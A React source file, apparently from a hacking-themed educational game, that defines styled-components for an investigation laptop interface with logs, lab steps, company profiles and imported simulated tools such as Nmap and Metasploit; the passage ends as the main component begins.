import React, { useState, useEffect } from 'react';
import styled, { keyframes } from 'styled-components';
import { motion, AnimatePresence } from 'framer-motion';
import { useNavigate } from 'react-router-dom';
import { useGame } from '../context/GameContext';
import { storyConfig } from '../story/storyConfig';
import WiresharkInterface from './tools/WiresharkInterface';
import NmapInterface from './tools/NmapInterface';
import MetasploitInterface from './tools/MetasploitInterface';
import SqlmapInterface from './tools/SqlmapInterface';
import OsintInterface from './tools/OsintInterface';
import { 
  FaLaptop, 
  FaTimes, 
  FaPlay, 
  FaChevronRight, 
  FaChevronLeft,
  FaFileAlt,
  FaNetworkWired,
  FaDatabase,
  FaShieldAlt,
  FaExclamationTriangle,
  FaCheckCircle,
  FaClock,
  FaUser,
  FaServer,
  FaGlobe,
  FaCode,
  FaLock,
  FaUnlock,
  FaEye,
  FaBomb,
  FaSearch,
  FaTools,
  FaBuilding,
  FaDollarSign,
  FaUserTie,
  FaPhone
} from 'react-icons/fa';

const InvestigationContainer = styled(motion.div)`
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background: rgba(0, 0, 0, 0.95);
  display: flex;
  align-items: center;
  justify-content: center;
  z-index: 10000;
  backdrop-filter: blur(10px);
`;

const LaptopFrame = styled(motion.div)`
  width: 90%;
  max-width: 1400px;
  height: 90vh;
  background: linear-gradient(145deg, #2a2a2a, #1a1a1a);
  border-radius: 20px;
  padding: 20px;
  box-shadow: 0 0 50px rgba(0, 255, 65, 0.3), inset 0 0 50px rgba(0, 0, 0, 0.5);
  position: relative;
  border: 3px solid #00ff41;
`;

const LaptopScreen = styled.div`
  width: 100%;
  height: 100%;
  background: #0a0a0a;
  border-radius: 10px;
  overflow: hidden;
  position: relative;
  border: 2px solid #333;
`;

const ScreenHeader = styled.div`
  background: linear-gradient(90deg, #1a1a2e, #16213e);
  padding: 15px 20px;
  display: flex;
  align-items: center;
  justify-content: space-between;
  border-bottom: 2px solid #00ff41;
`;

const ScreenTitle = styled.div`
  display: flex;
  align-items: center;
  gap: 10px;
  color: #00ff41;
  font-family: 'Orbitron', sans-serif;
  font-size: 1.2rem;
  font-weight: bold;
`;

const CloseButton = styled.button`
  background: transparent;
  border: 2px solid #ff0040;
  color: #ff0040;
  border-radius: 50%;
  width: 35px;
  height: 35px;
  display: flex;
  align-items: center;
  justify-content: center;
  cursor: pointer;
  transition: all 0.3s ease;

  &:hover {
    background: rgba(255, 0, 64, 0.1);
    transform: rotate(90deg);
  }
`;

const ScreenContent = styled.div`
  height: calc(100% - 70px);
  overflow-y: auto;
  padding: 30px;
  background: #0a0a0a;
  display: ${props => props.$hasTool ? 'grid' : 'block'};
  grid-template-columns: ${props => props.$hasTool ? '1fr 1fr' : '1fr'};
  gap: ${props => props.$hasTool ? '20px' : '0'};
  
  &::-webkit-scrollbar {
    width: 10px;
  }
  
  &::-webkit-scrollbar-track {
    background: rgba(0, 0, 0, 0.3);
  }
  
  &::-webkit-scrollbar-thumb {
    background: #00ff41;
    border-radius: 5px;
  }
`;

const StepsPanel = styled.div`
  overflow-y: auto;
  max-height: calc(100vh - 200px);
  padding: 20px;
  
  /* Ensure tools section is visible */
  &::-webkit-scrollbar {
    width: 8px;
  }
  
  &::-webkit-scrollbar-track {
    background: rgba(0, 0, 0, 0.3);
  }
  
  &::-webkit-scrollbar-thumb {
    background: #00ff41;
    border-radius: 4px;
  }
`;

const ToolPanel = styled.div`
  overflow-y: auto;
  max-height: calc(100vh - 200px);
  padding: 20px;
  background: rgba(0, 0, 0, 0.5);
  border-left: 2px solid #00ff41;
  display: flex;
  flex-direction: column;
  
  &::-webkit-scrollbar {
    width: 8px;
  }
  
  &::-webkit-scrollbar-track {
    background: rgba(0, 0, 0, 0.3);
  }
  
  &::-webkit-scrollbar-thumb {
    background: #00ff41;
    border-radius: 4px;
  }
`;

const ToolPanelHeader = styled.div`
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-bottom: 20px;
  padding-bottom: 15px;
  border-bottom: 2px solid #00ff41;
`;

const ToolPanelTitle = styled.h3`
  color: #00ff41;
  font-family: 'Orbitron', sans-serif;
  font-size: 1.3rem;
  margin: 0;
  display: flex;
  align-items: center;
  gap: 10px;
`;

const ToolCloseButton = styled.button`
  background: transparent;
  border: 2px solid #ff0040;
  color: #ff0040;
  border-radius: 8px;
  padding: 8px 16px;
  cursor: pointer;
  transition: all 0.3s ease;
  display: flex;
  align-items: center;
  gap: 8px;
  font-family: 'Orbitron', sans-serif;

  &:hover {
    background: rgba(255, 0, 64, 0.1);
  }
`;

const InvestigationDashboard = styled.div`
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 20px;
  margin-bottom: 30px;

  @media (max-width: 1200px) {
    grid-template-columns: 1fr;
  }
`;

const DashboardCard = styled(motion.div)`
  background: rgba(26, 26, 46, 0.8);
  border: 2px solid #00ff41;
  border-radius: 10px;
  padding: 20px;
`;

const CardTitle = styled.h3`
  color: #00ff41;
  font-family: 'Orbitron', sans-serif;
  font-size: 1.1rem;
  margin-bottom: 15px;
  display: flex;
  align-items: center;
  gap: 10px;
`;

const DataList = styled.ul`
  list-style: none;
  padding: 0;
`;

const DataItem = styled.li`
  color: #ccc;
  font-family: 'Share Tech Mono', monospace;
  font-size: 0.9rem;
  padding: 8px 0;
  border-bottom: 1px solid rgba(0, 255, 65, 0.1);
  display: flex;
  align-items: center;
  gap: 10px;

  &:last-child {
    border-bottom: none;
  }
`;

const DataLabel = styled.span`
  color: #00ffff;
  font-weight: bold;
  min-width: 150px;
`;

const DataValue = styled.span`
  color: #00ff41;
  word-break: break-all;
`;

const AlertBadge = styled.span`
  background: rgba(255, 170, 0, 0.2);
  border: 1px solid #ffaa00;
  color: #ffaa00;
  padding: 4px 8px;
  border-radius: 4px;
  font-size: 0.8rem;
  margin-left: auto;
`;

const CriticalBadge = styled.span`
  background: rgba(255, 0, 64, 0.2);
  border: 1px solid #ff0040;
  color: #ff0040;
  padding: 4px 8px;
  border-radius: 4px;
  font-size: 0.8rem;
  margin-left: auto;
`;

const GetStartedButton = styled(motion.button)`
  background: linear-gradient(45deg, #00ff41, #00cc33);
  border: none;
  border-radius: 8px;
  padding: 15px 30px;
  color: #000;
  font-family: 'Orbitron', sans-serif;
  font-weight: bold;
  font-size: 1.1rem;
  cursor: pointer;
  transition: all 0.3s ease;
  display: flex;
  align-items: center;
  gap: 10px;
  margin: 30px auto;
  width: fit-content;

  &:hover {
    background: linear-gradient(45deg, #00cc33, #00ff41);
    box-shadow: 0 0 30px rgba(0, 255, 65, 0.5);
    transform: translateY(-2px);
  }
`;

const StepContainer = styled(motion.div)`
  background: rgba(26, 26, 46, 0.8);
  border: 2px solid #00ff41;
  border-radius: 10px;
  padding: 25px;
  margin-bottom: 20px;
`;

const StepHeader = styled.div`
  display: flex;
  align-items: center;
  justify-content: space-between;
  margin-bottom: 20px;
`;

const StepNumber = styled.div`
  background: linear-gradient(45deg, #00ff41, #00cc33);
  color: #000;
  width: 40px;
  height: 40px;
  border-radius: 50%;
  display: flex;
  align-items: center;
  justify-content: center;
  font-family: 'Orbitron', sans-serif;
  font-weight: bold;
  font-size: 1.2rem;
`;

const StepTitle = styled.h3`
  color: #00ff41;
  font-family: 'Orbitron', sans-serif;
  font-size: 1.3rem;
  flex: 1;
  margin-left: 15px;
`;

const StepCard = styled(motion.div)`
  background: rgba(26, 26, 46, 0.9);
  border: 2px solid #00ff41;
  border-radius: 15px;
  padding: 30px;
  margin-bottom: 20px;
  min-height: 400px;
  display: flex;
  flex-direction: column;
`;

const StepCardHeader = styled.div`
  display: flex;
  align-items: center;
  justify-content: space-between;
  margin-bottom: 25px;
  padding-bottom: 15px;
  border-bottom: 2px solid #00ff41;
`;

const StepCardTitle = styled.h2`
  color: #00ff41;
  font-family: 'Orbitron', sans-serif;
  font-size: 1.5rem;
  margin: 0;
  flex: 1;
`;

const StepCardNavigation = styled.div`
  display: flex;
  gap: 10px;
  align-items: center;
`;

const StepCardNavButton = styled(motion.button)`
  background: ${props => props.disabled ? 'rgba(0, 255, 65, 0.2)' : 'rgba(0, 255, 65, 0.3)'};
  border: 2px solid #00ff41;
  color: ${props => props.disabled ? '#666' : '#00ff41'};
  padding: 10px 20px;
  border-radius: 8px;
  cursor: ${props => props.disabled ? 'not-allowed' : 'pointer'};
  font-family: 'Orbitron', sans-serif;
  font-size: 0.9rem;
  display: flex;
  align-items: center;
  gap: 8px;
  transition: all 0.3s ease;

  &:hover:not(:disabled) {
    background: rgba(0, 255, 65, 0.5);
    transform: translateY(-2px);
  }

  &:disabled {
    opacity: 0.5;
  }
`;

const StepCardContent = styled.div`
  flex: 1;
  overflow-y: auto;
  padding-right: 10px;
  
  &::-webkit-scrollbar {
    width: 8px;
  }
  
  &::-webkit-scrollbar-track {
    background: rgba(0, 0, 0, 0.3);
  }
  
  &::-webkit-scrollbar-thumb {
    background: #00ff41;
    border-radius: 4px;
  }
`;

const StepCardProgress = styled.div`
  text-align: center;
  color: #888;
  font-family: 'Orbitron', sans-serif;
  font-size: 0.9rem;
  margin-top: 20px;
  padding-top: 15px;
  border-top: 1px solid rgba(0, 255, 65, 0.3);
`;

const StepNavigation = styled.div`
  display: flex;
  gap: 10px;
`;

const NavButton = styled.button`
  background: rgba(0, 255, 65, 0.1);
  border: 2px solid #00ff41;
  color: #00ff41;
  border-radius: 8px;
  padding: 10px 15px;
  cursor: pointer;
  transition: all 0.3s ease;
  display: flex;
  align-items: center;
  gap: 8px;
  font-family: 'Orbitron', sans-serif;

  &:hover:not(:disabled) {
    background: rgba(0, 255, 65, 0.2);
    transform: translateY(-2px);
  }

  &:disabled {
    opacity: 0.3;
    cursor: not-allowed;
  }
`;

const StepContent = styled.div`
  color: #ccc;
  line-height: 1.8;
`;

const AnalysisSection = styled.div`
  background: rgba(0, 0, 0, 0.3);
  border-left: 4px solid #00ff41;
  padding: 15px;
  margin: 15px 0;
  border-radius: 5px;
`;

const AnalysisTitle = styled.div`
  color: #00ff41;
  font-weight: bold;
  margin-bottom: 10px;
  font-family: 'Orbitron', sans-serif;
`;

const AnalysisText = styled.div`
  color: #ccc;
  font-size: 0.95rem;
  line-height: 1.6;
`;

const CodeBlock = styled.div`
  background: rgba(0, 0, 0, 0.5);
  border: 1px solid #00ff41;
  border-radius: 5px;
  padding: 15px;
  margin: 15px 0;
  font-family: 'Share Tech Mono', monospace;
  font-size: 0.9rem;
  color: #00ff41;
  overflow-x: auto;
`;

const EvidenceGrid = styled.div`
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
  gap: 15px;
  margin: 20px 0;
`;

const EvidenceCard = styled.div`
  background: rgba(0, 0, 0, 0.3);
  border: 1px solid #00ffff;
  border-radius: 8px;
  padding: 15px;
`;

const EvidenceTitle = styled.div`
  color: #00ffff;
  font-weight: bold;
  margin-bottom: 8px;
  font-size: 0.9rem;
`;

const EvidenceValue = styled.div`
  color: #00ff41;
  font-family: 'Share Tech Mono', monospace;
  font-size: 0.85rem;
  word-break: break-all;
`;

const LogsContainer = styled.div`
  background: rgba(0, 0, 0, 0.5);
  border: 2px solid #00ff41;
  border-radius: 10px;
  padding: 20px;
  margin-top: 20px;
  max-height: 400px;
  overflow-y: auto;
`;

const LogsTitle = styled.h3`
  color: #00ff41;
  font-family: 'Orbitron', sans-serif;
  font-size: 1.1rem;
  margin-bottom: 15px;
  display: flex;
  align-items: center;
  gap: 10px;
`;

const LogEntry = styled.div`
  background: rgba(0, 0, 0, 0.3);
  border-left: 3px solid ${props => {
    if (props.severity === 'CRITICAL') return '#ff0040';
    if (props.severity === 'HIGH') return '#ffaa00';
    return '#00ffff';
  }};
  padding: 12px;
  margin-bottom: 10px;
  border-radius: 5px;
  font-family: 'Share Tech Mono', monospace;
  font-size: 0.85rem;
`;

const LogTimestamp = styled.span`
  color: #888;
  margin-right: 10px;
`;

const LogEvent = styled.span`
  color: #00ff41;
  font-weight: bold;
  margin-right: 10px;
`;

const LogSeverity = styled.span`
  color: ${props => {
    if (props.severity === 'CRITICAL') return '#ff0040';
    if (props.severity === 'HIGH') return '#ffaa00';
    return '#00ffff';
  }};
  margin-right: 10px;
  font-weight: bold;
`;

const LogSource = styled.span`
  color: #00ffff;
  margin-left: auto;
`;

const ViewLogsButton = styled(motion.button)`
  background: linear-gradient(45deg, #00ffff, #0099cc);
  border: none;
  border-radius: 8px;
  padding: 12px 25px;
  color: #000;
  font-family: 'Orbitron', sans-serif;
  font-weight: bold;
  cursor: pointer;
  transition: all 0.3s ease;
  display: flex;
  align-items: center;
  gap: 8px;
  margin: 20px 0;

  &:hover {
    background: linear-gradient(45deg, #0099cc, #00ffff);
    box-shadow: 0 0 20px rgba(0, 255, 255, 0.5);
    transform: translateY(-2px);
  }
`;

const LogsModal = styled(motion.div)`
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background: rgba(0, 0, 0, 0.95);
  display: flex;
  align-items: center;
  justify-content: center;
  z-index: 10001;
  backdrop-filter: blur(10px);
`;

const LogsModalContent = styled(motion.div)`
  background: linear-gradient(145deg, #1a1a2e, #0a0a0a);
  border: 2px solid #00ff41;
  border-radius: 15px;
  padding: 30px;
  max-width: 1000px;
  width: 90%;
  max-height: 90vh;
  overflow-y: auto;
  box-shadow: 0 0 50px rgba(0, 255, 65, 0.5);
  position: relative;
`;

const LogsModalHeader = styled.div`
  display: flex;
  align-items: center;
  justify-content: space-between;
  margin-bottom: 25px;
  padding-bottom: 15px;
  border-bottom: 2px solid #00ff41;
`;

const LogsModalTitle = styled.h2`
  color: #00ff41;
  font-family: 'Orbitron', sans-serif;
  font-size: 1.8rem;
  display: flex;
  align-items: center;
  gap: 10px;
`;

const DetailedLogEntry = styled.div`
  background: rgba(0, 0, 0, 0.4);
  border-left: 4px solid ${props => {
    if (props.severity === 'CRITICAL') return '#ff0040';
    if (props.severity === 'HIGH') return '#ffaa00';
    return '#00ffff';
  }};
  padding: 20px;
  margin-bottom: 20px;
  border-radius: 8px;
  position: relative;
`;

const LogTimeInfo = styled.div`
  color: #888;
  font-size: 0.85rem;
  margin-bottom: 10px;
  font-family: 'Share Tech Mono', monospace;
`;

const LogEventHeader = styled.div`
  display: flex;
  align-items: center;
  gap: 15px;
  margin-bottom: 15px;
  flex-wrap: wrap;
`;

const LogEventName = styled.div`
  color: #00ff41;
  font-weight: bold;
  font-size: 1.1rem;
  font-family: 'Orbitron', sans-serif;
`;

const LogSeverityBadge = styled.span`
  background: ${props => {
    if (props.severity === 'CRITICAL') return 'rgba(255, 0, 64, 0.2)';
    if (props.severity === 'HIGH') return 'rgba(255, 170, 0, 0.2)';
    return 'rgba(0, 255, 255, 0.2)';
  }};
  border: 1px solid ${props => {
    if (props.severity === 'CRITICAL') return '#ff0040';
    if (props.severity === 'HIGH') return '#ffaa00';
    return '#00ffff';
  }};
  color: ${props => {
    if (props.severity === 'CRITICAL') return '#ff0040';
    if (props.severity === 'HIGH') return '#ffaa00';
    return '#00ffff';
  }};
  padding: 5px 12px;
  border-radius: 15px;
  font-size: 0.85rem;
  font-weight: bold;
`;

const LogContext = styled.div`
  margin-top: 15px;
  padding-top: 15px;
  border-top: 1px solid rgba(0, 255, 65, 0.2);
`;

const ContextLabel = styled.div`
  color: #00ffff;
  font-weight: bold;
  margin-bottom: 8px;
  font-size: 0.9rem;
`;

const ContextText = styled.div`
  color: #ccc;
  font-size: 0.9rem;
  line-height: 1.6;
  margin-bottom: 12px;
  padding-left: 15px;
  border-left: 2px solid rgba(0, 255, 65, 0.3);
`;

const LogSourceIP = styled.div`
  color: #00ffff;
  font-family: 'Share Tech Mono', monospace;
  font-size: 0.9rem;
  margin-top: 10px;
`;

const ToolsSection = styled.div`
  margin-top: 30px;
  margin-bottom: 20px;
  padding: 25px;
  background: rgba(0, 0, 0, 0.7);
  border: 3px solid #00ffff;
  border-radius: 10px;
  width: 100%;
  box-sizing: border-box;
  box-shadow: 0 0 20px rgba(0, 255, 255, 0.3);
  position: relative;
  z-index: 1;
`;

const ToolsTitle = styled.h3`
  color: #00ffff;
  font-family: 'Orbitron', sans-serif;
  font-size: 1.1rem;
  margin-bottom: 15px;
  display: flex;
  align-items: center;
  gap: 10px;
`;

const ToolsGrid = styled.div`
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
  gap: 15px;
  margin-top: 15px;
`;

const ToolButton = styled(motion.button)`
  background: rgba(0, 255, 255, 0.1);
  border: 2px solid ${props => props.active ? '#00ff41' : '#00ffff'};
  border-radius: 8px;
  padding: 15px;
  color: ${props => props.active ? '#00ff41' : '#00ffff'};
  cursor: pointer;
  transition: all 0.3s ease;
  display: flex;
  flex-direction: column;
  align-items: center;
  gap: 8px;
  font-family: 'Orbitron', sans-serif;
  font-size: 0.9rem;
  font-weight: bold;

  &:hover {
    background: rgba(0, 255, 255, 0.2);
    transform: translateY(-3px);
    box-shadow: 0 0 15px rgba(0, 255, 255, 0.3);
  }

  ${props => props.active && `
    background: rgba(0, 255, 65, 0.2);
    box-shadow: 0 0 20px rgba(0, 255, 65, 0.5);
  `}
`;

const ToolIcon = styled.div`
  font-size: 2rem;
  color: ${props => props.active ? '#00ff41' : '#00ffff'};
`;

const ToolName = styled.div`
  font-size: 0.85rem;
`;

const ActionGuideSection = styled.div`
  margin-top: 20px;
  padding: 20px;
  background: rgba(0, 255, 65, 0.05);
  border: 1px solid rgba(0, 255, 65, 0.3);
  border-radius: 10px;
`;

const ActionGuideTitle = styled.h4`
  color: #00ff41;
  font-family: 'Orbitron', sans-serif;
  font-size: 1rem;
  margin-bottom: 15px;
  display: flex;
  align-items: center;
  gap: 10px;
`;

const ActionButton = styled(motion.button)`
  background: linear-gradient(135deg, rgba(0, 255, 65, 0.2), rgba(0, 255, 65, 0.1));
  border: 2px solid ${props => props.completed ? '#00ff41' : '#00ffff'};
  border-radius: 8px;
  padding: 12px 20px;
  color: ${props => props.completed ? '#00ff41' : '#00ffff'};
  cursor: pointer;
  transition: all 0.3s ease;
  display: flex;
  align-items: center;
  gap: 10px;
  font-family: 'Orbitron', sans-serif;
  font-size: 0.9rem;
  font-weight: bold;
  width: 100%;
  margin-bottom: 10px;
  text-align: left;

  &:hover {
    background: linear-gradient(135deg, rgba(0, 255, 65, 0.3), rgba(0, 255, 65, 0.2));
    transform: translateX(5px);
    box-shadow: 0 0 15px rgba(0, 255, 65, 0.3);
  }

  ${props => props.completed && `
    background: rgba(0, 255, 65, 0.2);
    box-shadow: 0 0 10px rgba(0, 255, 65, 0.4);
  `}
`;

const GuidanceText = styled.div`
  color: #ccc;
  font-size: 0.85rem;
  line-height: 1.6;
  margin-top: 10px;
  padding: 10px;
  background: rgba(0, 0, 0, 0.3);
  border-radius: 5px;
  font-family: 'Share Tech Mono', monospace;
`;

const InstructionDetail = styled.div`
  background: rgba(0, 0, 0, 0.4);
  border-left: 3px solid #00ff41;
  padding: 12px 15px;
  margin: 10px 0;
  border-radius: 5px;
  font-family: 'Share Tech Mono', monospace;
  color: #ccc;
  line-height: 1.8;
  white-space: pre-wrap;
`;

const LabInstructionPanel = styled.div`
  margin-top: 20px;
  padding: 20px;
  background: rgba(0, 255, 65, 0.05);
  border: 2px solid #00ff41;
  border-radius: 10px;
  max-height: 600px;
  overflow-y: auto;
`;

const LabHeader = styled.div`
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-bottom: 20px;
  padding-bottom: 15px;
  border-bottom: 2px solid #00ff41;
`;

const LabTitle = styled.h3`
  color: #00ff41;
  font-family: 'Orbitron', sans-serif;
  font-size: 1.2rem;
  margin: 0;
  display: flex;
  align-items: center;
  gap: 10px;
`;

const CompletionBadge = styled.div`
  padding: 5px 15px;
  background: ${props => props.$completed ? 'rgba(0, 255, 65, 0.2)' : 'rgba(255, 170, 0, 0.2)'};
  border: 2px solid ${props => props.$completed ? '#00ff41' : '#ffaa00'};
  border-radius: 20px;
  color: ${props => props.$completed ? '#00ff41' : '#ffaa00'};
  font-size: 0.85rem;
  font-weight: bold;
  font-family: 'Orbitron', sans-serif;
`;

const LabStep = styled.div`
  margin-bottom: 20px;
  padding: 15px;
  background: rgba(0, 0, 0, 0.3);
  border: 1px solid ${props => props.$completed ? '#00ff41' : '#00ffff'};
  border-radius: 8px;
  border-left: 4px solid ${props => props.$completed ? '#00ff41' : '#00ffff'};
`;

const LabStepHeader = styled.div`
  display: flex;
  align-items: center;
  gap: 15px;
  margin-bottom: 12px;
`;

const LabStepCheckbox = styled.button`
  width: 24px;
  height: 24px;
  border: 2px solid ${props => props.$completed ? '#00ff41' : '#00ffff'};
  background: ${props => props.$completed ? '#00ff41' : 'transparent'};
  border-radius: 4px;
  cursor: pointer;
  display: flex;
  align-items: center;
  justify-content: center;
  color: #000;
  font-size: 0.9rem;
  font-weight: bold;
  flex-shrink: 0;
  transition: all 0.3s ease;

  &:hover {
    background: ${props => props.$completed ? '#00cc33' : 'rgba(0, 255, 255, 0.2)'};
    border-color: ${props => props.$completed ? '#00ff41' : '#00ffff'};
  }
`;

const LabStepNumber = styled.div`
  color: #00ff41;
  font-weight: bold;
  font-size: 1rem;
  font-family: 'Orbitron', sans-serif;
  min-width: 40px;
`;

const LabStepTitle = styled.div`
  color: ${props => props.$completed ? '#00ff41' : '#00ffff'};
  font-weight: bold;
  font-size: 1rem;
  font-family: 'Orbitron', sans-serif;
  flex: 1;
  text-decoration: ${props => props.$completed ? 'line-through' : 'none'};
  opacity: ${props => props.$completed ? 0.7 : 1};
`;

const LabStepContent = styled.div`
  color: #ccc;
  font-size: 0.9rem;
  line-height: 1.8;
  font-family: 'Share Tech Mono', monospace;
  margin-left: 39px;
  margin-top: 10px;
`;

const LabStepCommand = styled.div`
  background: rgba(0, 0, 0, 0.5);
  border: 1px solid #00ffff;
  border-radius: 5px;
  padding: 10px;
  margin: 10px 0;
  color: #00ffff;
  font-family: 'Share Tech Mono', monospace;
  font-size: 0.9rem;
  cursor: pointer;
  transition: all 0.3s ease;

  &:hover {
    background: rgba(0, 255, 255, 0.1);
    border-color: #00ff41;
    color: #00ff41;
  }
`;

const AllCompleteMessage = styled.div`
  padding: 20px;
  background: rgba(0, 255, 65, 0.2);
  border: 2px solid #00ff41;
  border-radius: 10px;
  text-align: center;
  color: #00ff41;
  font-family: 'Orbitron', sans-serif;
  font-size: 1.1rem;
  font-weight: bold;
  margin-top: 20px;
`;

const CompaniesModal = styled(motion.div)`
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background: rgba(0, 0, 0, 0.95);
  display: flex;
  align-items: center;
  justify-content: center;
  z-index: 10003;
  backdrop-filter: blur(10px);
`;

const CompaniesModalContent = styled(motion.div)`
  background: rgba(26, 26, 46, 0.95);
  border: 3px solid #00ff41;
  border-radius: 15px;
  padding: 30px;
  max-width: 900px;
  max-height: 80vh;
  overflow-y: auto;
  width: 90%;
  box-shadow: 0 0 50px rgba(0, 255, 65, 0.5);
`;

const CompaniesModalHeader = styled.div`
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-bottom: 25px;
  padding-bottom: 15px;
  border-bottom: 2px solid #00ff41;
`;

const CompaniesModalTitle = styled.h2`
  color: #00ff41;
  font-family: 'Orbitron', sans-serif;
  font-size: 1.8rem;
  display: flex;
  align-items: center;
  gap: 10px;
`;

const CompaniesList = styled.div`
  display: grid;
  grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
  gap: 15px;
  margin-top: 20px;
`;

const CompanyItem = styled(motion.button)`
  background: rgba(0, 0, 0, 0.5);
  border: 2px solid #00ffff;
  border-radius: 10px;
  padding: 20px;
  color: #00ffff;
  cursor: pointer;
  text-align: left;
  transition: all 0.3s ease;
  font-family: 'Orbitron', sans-serif;

  &:hover {
    border-color: #00ff41;
    background: rgba(0, 255, 65, 0.1);
    transform: translateY(-3px);
    box-shadow: 0 0 20px rgba(0, 255, 65, 0.3);
  }
`;

const CompanyItemName = styled.div`
  font-size: 1.1rem;
  font-weight: bold;
  margin-bottom: 8px;
  color: #00ff41;
`;

const CompanyItemType = styled.div`
  font-size: 0.85rem;
  color: #888;
  text-transform: capitalize;
`;

const CompanyDetailsModal = styled(motion.div)`
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background: rgba(0, 0, 0, 0.95);
  display: flex;
  align-items: center;
  justify-content: center;
  z-index: 10004;
  backdrop-filter: blur(10px);
`;

const CompanyDetailsContent = styled(motion.div)`
  background: rgba(26, 26, 46, 0.95);
  border: 3px solid #00ff41;
  border-radius: 15px;
  padding: 30px;
  max-width: 800px;
  max-height: 85vh;
  overflow-y: auto;
  width: 90%;
  box-shadow: 0 0 50px rgba(0, 255, 65, 0.5);
`;

const CompanyDetailsHeader = styled.div`
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-bottom: 25px;
  padding-bottom: 15px;
  border-bottom: 2px solid #00ff41;
`;

const CompanyDetailsTitle = styled.h2`
  color: #00ff41;
  font-family: 'Orbitron', sans-serif;
  font-size: 1.8rem;
`;

const DetailSection = styled.div`
  margin-bottom: 25px;
  padding: 15px;
  background: rgba(0, 0, 0, 0.3);
  border-radius: 10px;
  border-left: 3px solid #00ff41;
`;

const DetailSectionTitle = styled.h3`
  color: #00ff41;
  font-family: 'Orbitron', sans-serif;
  font-size: 1.2rem;
  margin-bottom: 15px;
  display: flex;
  align-items: center;
  gap: 10px;
`;

const WeaknessItem = styled.div`
  padding: 10px;
  margin-bottom: 10px;
  background: rgba(255, 0, 0, 0.1);
  border: 1px solid rgba(255, 0, 0, 0.3);
  border-radius: 5px;
  color: #ff6666;
`;

const StrengthItem = styled.div`
  padding: 10px;
  margin-bottom: 10px;
  background: rgba(0, 255, 65, 0.1);
  border: 1px solid rgba(0, 255, 65, 0.3);
  border-radius: 5px;
  color: #00ff41;
`;

const WeaknessLevel = styled.div`
  padding: 8px 15px;
  background: ${props => {
    if (props.level === 'unclear') return 'rgba(255, 170, 0, 0.2)';
    if (props.level === 'low') return 'rgba(255, 0, 0, 0.2)';
    if (props.level === 'medium') return 'rgba(255, 100, 0, 0.2)';
    return 'rgba(255, 200, 0, 0.2)';
  }};
  border: 1px solid ${props => {
    if (props.level === 'unclear') return '#ffaa00';
    if (props.level === 'low') return '#ff0000';
    if (props.level === 'medium') return '#ff6400';
    return '#ffc800';
  }};
  border-radius: 5px;
  color: ${props => {
    if (props.level === 'unclear') return '#ffaa00';
    if (props.level === 'low') return '#ff6666';
    if (props.level === 'medium') return '#ff9966';
    return '#ffcc66';
  }};
  font-weight: bold;
  margin-top: 10px;
  text-align: center;
`;

const InternSection = styled.div`
  margin-top: 25px;
  padding: 20px;
  background: rgba(0, 255, 255, 0.05);
  border: 2px solid #00ffff;
  border-radius: 10px;
`;

const InternTier = styled(motion.button)`
  width: 100%;
  padding: 15px;
  margin-bottom: 10px;
  background: ${props => props.selected ? 'rgba(0, 255, 65, 0.2)' : 'rgba(0, 0, 0, 0.5)'};
  border: 2px solid ${props => props.selected ? '#00ff41' : '#00ffff'};
  border-radius: 8px;
  color: ${props => props.selected ? '#00ff41' : '#00ffff'};
  cursor: pointer;
  text-align: left;
  transition: all 0.3s ease;
  font-family: 'Orbitron', sans-serif;

  &:hover {
    background: rgba(0, 255, 65, 0.2);
    border-color: #00ff41;
    transform: translateX(5px);
  }
`;

const InternTierName = styled.div`
  font-size: 1.1rem;
  font-weight: bold;
  margin-bottom: 5px;
`;

const InternTierDetails = styled.div`
  font-size: 0.85rem;
  color: #888;
  margin-bottom: 5px;
`;

const InternTierPrice = styled.div`
  font-size: 0.9rem;
  color: #00ff41;
  font-weight: bold;
`;

const HireButton = styled(motion.button)`
  width: 100%;
  padding: 15px;
  background: linear-gradient(135deg, #00ff41, #00cc33);
  border: none;
  border-radius: 8px;
  color: #000;
  font-weight: bold;
  font-size: 1rem;
  cursor: pointer;
  margin-top: 15px;
  font-family: 'Orbitron', sans-serif;

  &:hover {
    background: linear-gradient(135deg, #00cc33, #00ff41);
    box-shadow: 0 0 20px rgba(0, 255, 65, 0.5);
  }

  &:disabled {
    opacity: 0.5;
    cursor: not-allowed;
  }
`;

const BackButton = styled(motion.button)`
  padding: 10px 20px;
  background: rgba(0, 0, 0, 0.5);
  border: 2px solid #00ffff;
  border-radius: 8px;
  color: #00ffff;
  font-weight: bold;
  font-size: 0.9rem;
  cursor: pointer;
  font-family: 'Orbitron', sans-serif;
  display: flex;
  align-items: center;
  gap: 8px;
  margin-bottom: 20px;

  &:hover {
    background: rgba(0, 255, 255, 0.2);
    border-color: #00ff41;
    color: #00ff41;
  }
`;

const ConfirmButton = styled(motion.button)`
  width: 100%;
  padding: 15px;
  background: linear-gradient(135deg, #00ff41, #00cc33);
  border: none;
  border-radius: 8px;
  color: #000;
  font-weight: bold;
  font-size: 1.1rem;
  cursor: pointer;
  margin-top: 20px;
  font-family: 'Orbitron', sans-serif;
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 10px;

  &:hover {
    background: linear-gradient(135deg, #00cc33, #00ff41);
    box-shadow: 0 0 20px rgba(0, 255, 65, 0.5);
    transform: translateY(-2px);
  }
`;

const InternResults = styled.div`
  margin-top: 20px;
  padding: 20px;
  background: rgba(0, 255, 65, 0.1);
  border: 2px solid #00ff41;
  border-radius: 10px;
  color: #00ff41;
`;

const InternResultsTitle = styled.h4`
  color: #00ff41;
  font-family: 'Orbitron', sans-serif;
  margin-bottom: 15px;
  font-size: 1.2rem;
`;

const InternResultsText = styled.div`
  line-height: 1.8;
  color: #ccc;
  font-family: 'Share Tech Mono', monospace;
`;


const InvestigationInterface = ({ story, character, step, onClose }) => {
  const { gameState, dispatch } = useGame();
  const navigate = useNavigate();
  const [showInvestigation, setShowInvestigation] = useState(true);
